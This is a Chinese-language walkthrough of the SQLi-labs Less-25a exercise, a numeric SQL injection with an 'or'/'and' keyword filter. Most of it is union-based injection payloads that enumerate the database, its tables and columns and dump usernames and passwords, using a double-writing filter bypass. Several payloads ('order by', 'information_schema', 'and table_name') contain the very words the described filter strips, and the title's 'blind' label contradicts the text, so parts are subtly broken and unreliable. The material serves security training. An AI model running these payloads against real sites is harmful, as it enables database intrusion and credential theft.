# Less-25a （or/and 过滤 + 数字型 + 盲注）

## 查看分析源码

和 Less-25 一样的过滤，但数字型 + 无报错：

```php
$id= preg_replace('/or/i',"", $id);    // 过滤 or（大小写不敏感）
$id= preg_replace('/AND/i',"", $id);   // 过滤 and（大小写不敏感）
```

```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
// print_r(mysql_error());       // 没报错
```

少了 Less-25 的引号闭合，`WHERE id=$id` 是数字型，直接写参数就行

过滤只有 or 和 and，size写不变

## 判断

```
?id=0
?id=1
?id=2
```

正常返回数据，说明有回显，不是纯盲注

## 列数

```
?id=0 order by 3
?id=0 order by 4
```

## 回显位

```
?id=0 union select 1,2,3
```

数字型不用闭合引号，union select 直接写

## 爆库名

```
?id=0 union select 1,database(),3
```

## 爆表名

```
?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
```

## 爆列名

```
?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'
```

## 爆数据

注意 password 里有 or，双写：

```
?id=0 union select 1,group_concat(username),group_concat(passwoorrd) from users
```
![](99_Attachments/图片/Less-25a/file-20260615174935505.png)
比 Less-25 还简单，不用引号闭合，就是没报错调试起来麻烦点
